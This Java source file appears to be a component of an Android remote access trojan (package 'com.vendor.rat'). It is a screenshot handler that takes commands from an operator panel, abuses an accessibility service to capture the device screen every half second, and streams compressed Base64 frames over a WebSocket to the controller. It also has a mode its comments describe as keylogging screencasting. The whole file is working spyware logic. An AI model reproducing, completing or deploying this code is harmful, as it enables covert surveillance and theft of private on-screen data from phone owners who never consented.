package com.vendor.rat.control.handler;

import android.graphics.Bitmap;
import android.util.Base64;
import android.util.Log;

import com.google.gson.JsonObject;
import com.vendor.rat.network.NetworkManager;
import com.vendor.rat.network.WebSocketClient;
import com.vendor.rat.service.MyAccessibilityService;

import java.io.ByteArrayOutputStream;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ScheduledFuture;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * 截图/投屏处理器
 *
 * 接收 Panel 下发的 screencomd/Screen 命令:
 *   comdtype=SN   → 实时投屏 → subc="screen"    (Panel case 'screen' → OCR)
 *   comdtype=SM   → 实时截图 → subc="screenshot" (Panel case 'screenshot' → ScreenViewer)
 *   comdtype=SK   → 键盘记录投屏 → subc="screenshot"
 *   comdtype=SNOFF/SMOFF/SKOFF → 停止
 */
public class ScreenshotHandler {

    private static final String TAG = "ScreenshotHandler";
    private static final int JPEG_QUALITY = 30;
    private static final float SCALE_FACTOR = 0.5f;
    private static final long FRAME_INTERVAL_MS = 500;

    private final ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();
    private ScheduledFuture<?> streamingTask;
    private final AtomicBoolean streaming = new AtomicBoolean(false);

    // 当前上报的 subc: "screen" (投屏/OCR) 或 "screenshot" (截图/ScreenViewer)
    private volatile String activeSubc = "screenshot";

    public void handle(JsonObject command) {
        String comdtype = command.has("comdtype") ? command.get("comdtype").getAsString() : "";
        Log.d(TAG, "Screen command: comdtype=" + comdtype);

        switch (comdtype) {
            case "SN":
                startStreaming("screen");
                break;
            case "SM":
            case "SK":
                startStreaming("screenshot");
                break;
            case "SMOFF":
            case "SNOFF":
            case "SKOFF":
                stopStreaming();
                break;
            default:
                Log.w(TAG, "Unknown screen comdtype: " + comdtype);
        }
    }

    private void startStreaming(String subc) {
        // 如果已在 streaming，先停止再切换模式
        if (streaming.get()) {
            stopStreaming();
        }

        streaming.set(true);
        activeSubc = subc;

        MyAccessibilityService service = MyAccessibilityService.P();
        if (service == null) {
            Log.e(TAG, "AccessibilityService not available, cannot start streaming");
            streaming.set(false);
            return;
        }

        Log.i(TAG, "Starting screen streaming: subc=" + subc + ", interval=" + FRAME_INTERVAL_MS + "ms");

        streamingTask = scheduler.scheduleAtFixedRate(
            this::captureAndSendFrame,
            0, FRAME_INTERVAL_MS, TimeUnit.MILLISECONDS
        );
    }

    private void stopStreaming() {
        if (!streaming.getAndSet(false)) {
            return;
        }

        if (streamingTask != null) {
            streamingTask.cancel(false);
            streamingTask = null;
        }

        Log.i(TAG, "Screen streaming stopped");
    }

    private void captureAndSendFrame() {
        if (!streaming.get()) return;

        MyAccessibilityService service = MyAccessibilityService.P();
        if (service == null) {
            Log.w(TAG, "AccessibilityService lost, stopping stream");
            stopStreaming();
            return;
        }

        WebSocketClient wsClient = NetworkManager.getInstance().getWebSocketClient();
        if (wsClient == null || !wsClient.isConnected()) {
            Log.w(TAG, "WebSocket not connected, skipping frame");
            return;
        }

        final String subc = activeSubc;

        service.takeScreenshotAsync(new MyAccessibilityService.ScreenshotCallback() {
            @Override
            public void onScreenshot(Bitmap bitmap) {
                try {
                    int origW = bitmap.getWidth();
                    int origH = bitmap.getHeight();

                    // 缩放
                    int scaledW = (int) (origW * SCALE_FACTOR);
                    int scaledH = (int) (origH * SCALE_FACTOR);
                    Bitmap scaled = Bitmap.createScaledBitmap(bitmap, scaledW, scaledH, true);
                    bitmap.recycle();

                    // JPEG 压缩
                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    scaled.compress(Bitmap.CompressFormat.JPEG, JPEG_QUALITY, baos);
                    scaled.recycle();

                    // Base64 编码
                    String base64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);

                    // 上报: subc 由 comdtype 决定
                    wsClient.sendScreen(subc, base64, origW, origH);
                } catch (Exception e) {
                    Log.e(TAG, "Frame encode/send failed", e);
                }
            }

            @Override
            public void onError(String error) {
                Log.w(TAG, "Screenshot failed: " + error);
            }
        });
    }

    public boolean isStreaming() {
        return streaming.get();
    }
}
